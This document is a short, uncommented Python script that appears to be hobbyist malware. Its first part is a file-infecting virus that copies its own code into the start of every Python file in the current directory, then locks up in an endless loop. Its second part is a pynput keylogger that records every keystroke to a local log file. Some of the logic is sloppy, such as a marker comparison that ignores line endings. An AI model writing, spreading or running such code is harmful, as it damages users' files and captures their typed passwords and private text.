# I CAST MIRROR IMAGE!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# I CAST MIRROR IMAGE!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# I TAKE MY TIME BACK\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# I CAST MIRROR IMAGE!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print("YOU SHALL BE MINE")
    while True:
        pass

malicious_code()

# I TAKE MY TIME BACK

from pynput.keyboard import Listener


def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)
    print(key)


if __name__ == '__main__':
    while True:
        with Listener(on_press=log_keystroke) as L:
            L.join()
